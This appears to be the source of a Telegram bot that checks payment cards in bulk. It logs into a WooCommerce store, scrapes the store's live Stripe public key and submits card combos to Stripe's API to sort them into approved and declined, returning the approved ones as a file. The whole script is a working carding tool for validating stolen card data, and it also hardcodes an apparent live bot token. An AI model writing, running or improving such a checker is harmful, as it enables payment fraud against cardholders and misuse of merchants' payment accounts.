import requests
import re
import threading
import logging
import json
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from io import BytesIO

BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"

logging.basicConfig(level=logging.INFO)
user_data = {}
lock = threading.Lock()


def get_headers():
    return {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "accept": "text/html,application/xhtml+xml",
        "accept-language": "en-US,en;q=0.9",
    }


def detect_stripe_type(html):
    if "setup_intent" in html:
        return "setup_intent"
    elif "payment_method" in html:
        return "payment_method"
    elif "source" in html:
        return "source"
    elif "token" in html:
        return "token"
    return "unknown"


def extract_pk(html):
    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
    return match.group(0) if match else None


def try_login(site, email, password, session):
    login_url = f"https://{site}/my-account/"
    r = session.get(login_url, headers=get_headers())
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})

    if not nonce:
        return False, "Login page error."

    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }

    r = session.post(login_url, data=payload, headers=get_headers())
    return ("customer-logout" in r.text), r.text


async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args or len(args) < 1 or '|' not in args[0]:
        await update.message.reply_text("Usage: /addsitelogin site|email|password")
        return

    site, email, password = args[0].split("|")
    session = requests.Session()

    success, resp_html = try_login(site, email, password, session)
    if not success:
        await update.message.reply_text("Login failed.")
        return

    with lock:
        user_data[user_id] = {
            "site": site,
            "email": email,
            "password": password,
            "session": session,
        }

    await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")


async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login first using /addsitelogin")
        return

    url = update.message.text
    session = user_data[user_id]["session"]
    r = session.get(url, headers=get_headers())
    html = r.text
    pk = extract_pk(html)
    stripe_type = detect_stripe_type(html)

    if not pk or stripe_type == "unknown":
        await update.message.reply_text("Could not extract Stripe public key or detect type.")
        return

    user_data[user_id]["check_url"] = url
    user_data[user_id]["stripe_pk"] = pk
    user_data[user_id]["stripe_type"] = stripe_type

    await update.message.reply_text(f"URL saved!\nStripe Type: `{stripe_type}`\nPublic Key: `{pk}`", parse_mode="Markdown")


def parse_card(card):
    match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
    return match.groups() if match else None


def check_card(card, data):
    try:
        parsed = parse_card(card)
        if not parsed:
            return f"{card} -> Invalid format"
        cc, mm, yy, cvv = parsed
        if len(yy) == 2:
            yy = "20" + yy

        pk = data.get("stripe_pk")
        stripe_type = data.get("stripe_type")

        r = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers={"Authorization": f"Bearer {pk}"},
            data={
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv,
            }
        )
        stripe_resp = r.json()
        if 'error' in stripe_resp:
            return f"{card} -> Declined ❌\n`{stripe_resp['error']['message']}`"

        return f"{card} -> Approved ✅\n`{stripe_resp['id']}`"

    except Exception as e:
        return f"{card} -> Error: {str(e)}"


async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login and provide Add Payment URL first.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
        return

    combo = context.args[0]
    result = check_card(combo, user_data[user_id])
    await update.message.reply_text(result, parse_mode="Markdown")


async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login and send Add Payment URL first.")
        return

    file = await update.message.document.get_file()
    content = await file.download_as_bytes()
    combos = content.decode().splitlines()

    stats = {"total": 0, "approved": 0, "declined": 0, "errors": 0}
    approved = []

    await update.message.reply_text(f"Checking {len(combos)} combos...")

    for combo in combos:
        stats["total"] += 1
        result = check_card(combo, user_data[user_id])
        if "Approved" in result:
            stats["approved"] += 1
            approved.append(result)
        elif "Declined" in result:
            stats["declined"] += 1
        else:
            stats["errors"] += 1

    msg = f"""
*Check Complete!*
Total: {stats['total']}
✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}
⚠️ Errors: {stats['errors']}
    """.strip()

    await update.message.reply_text(msg, parse_mode="Markdown")

    if approved:
        text = "\n".join(approved)
        await update.message.reply_document(document=BytesIO(text.encode()), filename="approved.txt")


if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), handle_txt))
    app.run_polling()
